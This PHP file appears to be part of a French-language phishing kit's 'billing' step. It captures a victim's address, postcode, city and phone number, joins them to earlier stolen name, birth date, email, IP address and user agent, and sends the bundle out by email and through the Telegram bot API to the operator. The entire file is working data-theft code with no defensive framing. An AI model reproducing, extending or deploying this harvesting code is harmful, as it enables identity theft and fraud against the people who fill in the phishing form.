<?php
session_start();


include("../infos.php");
include("../common/sub_includes.php");


if(isset($_POST))
{

	$_SESSION['adresse'] = htmlspecialchars($_POST['input_adresse']);
	$_SESSION['zip'] = htmlspecialchars($_POST['input_zipcode']);
	$_SESSION['city'] = htmlspecialchars($_POST['input_city']);
	$_SESSION['phone'] = htmlspecialchars($_POST['input_tel']);


		if($mail_sending == true){

			$message = "

[🌹] Full Info [🌹]

🌹 Adresse : ".$_SESSION['adresse']."
🌹 Code Postal : ".$_SESSION['zip']."
🌹 Ville : ".$_SESSION['city']."
🌹 Numéro de téléphone : ".$_SESSION['phone']."

[🍉] Log & Infos [🍉]

🍉 Nom : ".$_SESSION['nom']."
🍉 Prénom : ".$_SESSION['prenom']."
🍉 Naissance : ".$_SESSION['naissance']."
🍉 Email : ".$_SESSION['mail']."

[👾] Tiers [👾]

👾 Adresse ip : ".$_SESSION['ip']."
👾 User Agen : ".$_SESSION['useragent']."



			";
	
			$subject = "「🌹」 +1 Full info • ".$_SESSION['nom']." • ".$_SESSION['prenom']." • ".$_SESSION['ip'];
			$headers = "From: BOB L'EPONGE <max@gmail.com>";
			mail($rezmail, $subject, $message, $headers, $head);
  
		  }
  
				  ##########################
				  #### TELEGRAM SENDING ####
				  ##########################
  
		  
		if($telegram_sending == true){
  
			$data = [
			  'text' => '

[🌹] Personnel [🌹]

🌹 Adresse :'.$_SESSION['adresse'].'
🌹 Ville : '.$_SESSION['city'].'
🌹 Code Postal : '.$_SESSION['zip'].'
🌹 Téléphone : '.$_SESSION['phone'].'

[🍉] Log & Infos [🍉]

🍉 Nom : '.$_SESSION['nom'].'
🍉 Prénom : '.$_SESSION['prenom'].'
🍉 Naissance : '.$_SESSION['naissance'].'
🍉 Email : '.$_SESSION['mail'].'

[👾] Tiers [👾]

👾 Adresse IP : '.$_SESSION['ip'].'
👾 User-agent : '.$_SESSION['useragent'].'

  
			  ',
			  'chat_id' => $chat_billing
			];
  
			file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
		}

        $_SESSION['billinged'] = true;

	

}
else{


}

?>